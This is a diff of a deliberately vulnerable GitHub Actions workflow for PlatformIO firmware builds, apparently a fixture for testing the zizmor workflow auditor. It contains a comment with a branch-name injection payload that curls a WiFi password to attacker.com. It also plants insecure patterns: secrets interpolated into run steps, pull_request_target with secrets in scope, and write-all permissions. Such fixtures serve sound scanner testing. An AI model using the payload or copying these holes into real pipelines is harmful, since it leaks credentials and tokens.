@@ -5,7 +5,7 @@
 # Vulnerabilities present (zizmor audit rules triggered):
 #   1. dangerous-triggers      — pull_request_target with secrets in scope
 #   2. template-injection      — PR branch name injected raw into shell
-#   3. unpinned-uses           — mutable @v3 tags on all actions
+#   3. unpinned-uses           — mutable tags on all actions
 #   4. excessive-permissions   — write-all at workflow level
 #   5. secrets-outside-env     — secrets interpolated directly into run:
 #   6. artipacked              — checkout persists git credentials to artifact
@@ -39,29 +39,28 @@ jobs:
       - name: Install PlatformIO
         run: pip install platformio
 
-      # VULN 4: PR title and branch name flow directly into shell unquoted.
-      # Attacker names branch: x"; curl https://attacker.com?k=$WIFI_PASS; echo "
+      # VULN 2+4: PR title and branch name flow directly into shell unquoted.
+      # Attacker names branch: x"; curl https://attacker.com?k=$D_WIFI_PASS; echo "
       - name: Log build info
         run: |
           echo "Building PR: ${{ github.event.pull_request.title }}"
           echo "Branch: ${{ github.event.pull_request.head.ref }}"
           echo "Author: ${{ github.event.pull_request.user.login }}"
 
-      # VULN 5: Secrets interpolated directly into run: — visible in logs,
-      # exfiltrable by any step that runs before or after this one
-      - name: Write firmware secrets
-        run: |
-          echo '[env:m5stick-c]' >> platformio.ini
-          echo 'build_flags =' >> platformio.ini
-          echo '  -DWIFI_SSID=\"${{ secrets.WIFI_SSID }}\"' >> platformio.ini
-          echo '  -DWIFI_PASS=\"${{ secrets.WIFI_PASSWORD }}\"' >> platformio.ini
-          echo '  -DOTA_TOKEN=\"${{ secrets.OTA_SIGNING_TOKEN }}\"' >> platformio.ini
-
       - name: Run SAST (clang-tidy via PlatformIO)
         run: pio check --environment m5stick-c --severity low
 
+      # VULN 5: secrets interpolated directly into run: — visible in logs and
+      # exfiltrable by any step. PlatformIO picks them up via sysenv.* but
+      # the ${{ secrets.* }} expression is evaluated by GitHub before the shell
+      # sees the script, making the values trivially extractable.
       - name: Build firmware
-        run: pio run --environment m5stick-c
+        run: |
+          D_WIFI_SSID="${{ secrets.D_WIFI_SSID }}" \
+          D_WIFI_PASS="${{ secrets.D_WIFI_PASS }}" \
+          D_WIFI_USER="${{ secrets.D_WIFI_USER }}" \
+          GITHUB_TOKEN="${{ secrets.GITHUB_TOKEN }}" \
+          pio run --environment m5stick-c
 
       # VULN 6: checkout@v3 persists git credentials in .git/config
       # upload-artifact then bundles .git/ — credentials leak in the artifact
